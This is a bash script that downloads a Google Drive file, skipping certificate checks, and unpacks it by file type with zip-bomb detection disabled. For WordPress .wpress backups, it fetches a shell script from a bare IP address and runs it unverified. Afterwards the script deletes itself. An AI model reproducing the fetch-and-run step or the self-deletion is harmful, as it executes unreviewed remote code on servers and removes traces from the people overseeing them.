#!/bin/bash

ID=`echo $1 | awk -F/file/d/ '{print $2}' | awk -F/ '{print $1}'`
NAME=$2
#NAME=`date +%Y-%m-%d`

wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=$ID' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=$ID" -O "$NAME" && rm -rf /tmp/cookies.txt


echo -e "\n\e[33m--## CHECK gdrive DIRECTORY\e[0m"
    if [ -d gdrive ];
    then
        echo -e "gdrive directory already exists"
        # /usr/bin/mkdir ~/domains/$userDomain/public_html/OLD2
        echo -e "rename gdrive to gdrive-$(date +%Y-%m-%d_%H%M%S)"
        /usr/bin/mv gdrive gdrive-$(date +%Y-%m-%d_%H%M%S)
        # echo -e "\nbackup /public_html/* to OLD2 directory"
        echo -e "gdrive directory created \n"
        /usr/bin/mkdir gdrive
        /usr/bin/mv -v $NAME gdrive/
        cd gdrive
    else
        echo -e "gdrive directory does not exists, gdrive directory created "
        /usr/bin/mkdir gdrive-$(date +%Y-%m-%d_%H%M%S)
        echo -e "\nmove $NAME to gdrive"
        /usr/bin/mv -v $NAME gdrive-$(date +%Y-%m-%d_%H%M%S)/
        cd gdrive-$(date +%Y-%m-%d_%H%M%S)
    fi



# mkdir gdrive
# mv -v $NAME gdrive/

# cd gdrive/


   if [ "${NAME: -7}" == ".tar.gz" ]; then
       tar xf $NAME
   elif [ "${NAME: -4}" == ".zip" ]; then
       UNZIP_DISABLE_ZIPBOMB_DETECTION=TRUE unzip $NAME
   elif [ "${NAME: -4}" == ".tar" ]; then
       tar xzvf $NAME
   elif [ "${NAME: -3}" == ".gz" ]; then
       gunzip -f $NAME
   elif [ "${NAME: -4}" == ".rar" ]; then
       unrar x $NAME
   elif [ "${NAME: -7}" == ".wpress" ]; then
    echo -e "\e .wpress detected, move to ~ \e"
    mv -v $NAME ~/
    cd ~/
    wget -c 156.67.218.112/cs_team_nmwp.sh ; bash cs_team_nmwp.sh
    # mv ~/$NAME cs_team_backup_$NAME
    # mv -v cs_team_backup_$NAME ~/
   else
       echo "file $NAME, no action"
   fi

cd ~
echo ""
pwd 
echo ""
echo -e "\e===========================\e"
echo "DDONE"
echo -e "\e===========================\e"

rm -- "$0"




